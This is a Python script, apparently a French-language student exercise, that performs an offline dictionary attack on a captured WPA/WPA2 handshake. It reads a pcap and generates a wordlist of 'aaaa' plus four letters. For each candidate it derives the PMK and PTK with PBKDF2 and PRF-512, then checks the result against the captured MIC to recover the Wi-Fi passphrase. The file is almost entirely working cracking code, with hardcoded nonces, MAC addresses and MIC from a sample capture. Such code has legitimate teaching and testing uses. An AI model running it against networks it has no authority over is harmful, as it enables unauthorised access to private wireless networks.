#!/usr/bin/python

from scapy.all import *
from subprocess import *
import hmac,hashlib,binascii,string,itertools,codecs,os,sys
from pbkdf2 import PBKDF2
from scapy_eap import WPA_key 

#générateur du dictionnaire
def genere_dico():
	#Nous avons que l'admin a saisi 4 'a' de suite, donc le pwd est de la forme: aaaa****
	if(os.path.getsize("dictionnaire.txt")==0): #on génère le dico que s'il est vide
		chars='abcdefghijklmnopqrstuvwxyz'
		desc=open("dictionnaire.txt","w")
		for i in itertools.product(chars,repeat=4):
			desc.write("aaaa"+''.join(i)+"\n")
		desc.close()

#calucl de PMK
def PMK(psk,ssid):
	pmk=PBKDF2(psk,ssid,4096)
	return pmk.read(32)
	#return "9e9988bde2cba74395c0289ffda07bc41ffa889a3309237a2240c934bcdc7ddb"
#fct prf
def prf_512(K,A,B):
	R=b''
	A=A.encode('utf-8')
	octe=0
	i=0
	#bytes([octe] nous donne exactement l'octed 0(0x00) dans la chaine b
	while len(R)<64: #parce que 512=64*8
		b=A+bytes([octe])+B+bytes([i])
		mon_hashmac = hmac.new(K,digestmod=hashlib.sha1)
		mon_hashmac.update(b)
		val_hmac = mon_hashmac.digest()
		R+=val_hmac
		i+=1
	return R[:64]# on recupere les 64 premiers caractères de R qui valent 512 bits

#preparation de la donnée B qui sera passée au PRF
def get_B(mac_a,mac_s,nonce_a,nonce_s):
	#conversion en numerique des macs
	mac_s=mac_s.replace(':','')
	mac_s=binascii.a2b_hex(mac_s)#convertir les macs dans le format des nonces afin de pouvoir concatener
	mac_a=mac_a.replace(':','')
	m=mac_a
	mac_a=binascii.a2b_hex(mac_a)
	min_nonce=min(nonce_a,nonce_s)
	max_nonce=max(nonce_a,nonce_s)
	min_mac=min(mac_a,mac_s)
	max_mac=max(mac_s,mac_a)
	return min_mac+max_mac+min_nonce+max_nonce

#Definition de la fonction pricipal d'attaque

def main():
	#Lecture des données de la capture pour avoir des infos connues
	try:
		paquets=rdpcap("capture_wpa.pcap")
	except Exception as e:
		print("Erreur de lecture de la capture wireshark")
		sys.exit(1)

	#génération du dico d'attaque
	genere_dico()

	#******************************************************* RECUPERATION DES DONNÉE NÉCESSAIRE*****************************************************
	#ssid=paquets[0].info.decode()
	ssid="soho-psk"
	#Dans la première echange on a adr_mac dst(addr1) et adr_mac src(addr2)
	#mac_S=paquets[1].addr1
	mac_S="00:0c:41:da:f2:e7"
	#mac_A=paquets[1].addr2
	mac_A="00:20:a6:4f:31:e4"
	#dans le 2e echange, on a nonce de S
	#nonce_S=paquets[2].nonce
	nonce_S="ed12afbda8c583050032e5b5295382d27956fd584a6343bafe49135f26952a0f"
	nonce_S = binascii.a2b_hex(nonce_S)
	#dans le 3e echange
	#nonce_A=paquets[3].nonce
	nonce_A="477ba8dc6d7e80d01a309d35891d868eb82bcc3b5d52b5a9a42c4cb7fd343a64"
	nonce_A = binascii.a2b_hex(nonce_A)
	#mic dans le 4e echange
	A="Pairwise key expansion"
	B= get_B(mac_A,mac_S,nonce_A,nonce_S)
	#*********************************************************************************************************************************************
	#recuperation du d'une copie du paquet, auquel on enlève le mic et essayer de générer un nouveau mic
	#paquet=paquets[4][EAPOL]
	#MIC=paquet.wpa_key_mic
	MIC="f3a0f6914e28a2df103061a41ee83878"
	MIC=binascii.a2b_hex(MIC)
	#on met à vide le champs mic de notre paquet eapol
	#Enlever le mic au paquet EAPOL, en mettant ses 16 octets tous à 0x00 
	paquet='0103005ffe01090000000000000000000200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'
	paquet = binascii.a2b_hex(paquet)
	#paquet.key_ACK = 0
	#paquet.wpa_key_mic=''
	#on deroule l'algoritheme d'attaque donné par le prof(page4 du projet)
	print("***************************************** PATIENTEZ, RECHERCHE DU PASSWORD *********************************************************")
	for l in open("dico_jeux_test.txt").readlines():
		PTK=prf_512(PMK(l.strip("\n"),ssid),A,B) 
		#PTK="ccbf97a82b5c51a44325a77e9bc57050daec5438430f00eb893d84d8b4b4b5e819f4dce0cc5f2166e94fdb3eaf68eb7680f4e2646e6d9e36260d89ffbf24ee7e"
		#on sait que KCK= les 128 premiers bits(16 chars) de TCK
		KCK=PTK[:16]
		#on calcul le mic avec, avec sha1 version wpa2 et md5 version wpa
		if paquets[1].key_descriptor_Version==1:#wpa, donc md5
			mon_hashmac = hmac.new(KCK,digestmod=hashlib.md5)
			mon_hashmac.update(bytes(paquet))
			val_hmac = mon_hashmac.digest()
			if val_hmac==MIC:
				print("Le mic trouvé est: ",val_hmac.hex())
				print("Le mot de passe est: ",l)
				break
			l='' # on met l à vide pour pouvoir tester le cas où on finit le dico sans trouver le bon mdp
		else: #wpa2
			mon_hashmac = hmac.new(KCK,digestmod=hashlib.sha1)
			mon_hashmac.update(bytes(paquet))
			val_hmac = mon_hashmac.digest()
			print(val_hmac)
			if(val_hmac==MIC):
			 	print("Le mic trouvé est: ",val_hmac.hex())
			 	print("Le mot de passe est: ",l)
			 	break
			l=''
	if l=='':
		#Si on finit le dico sans rien trouver, alors le psssword ne se trouve pas dans le dico choisi
		print("Mot de passe non trouvé dans le dictionnaire")
	
main()
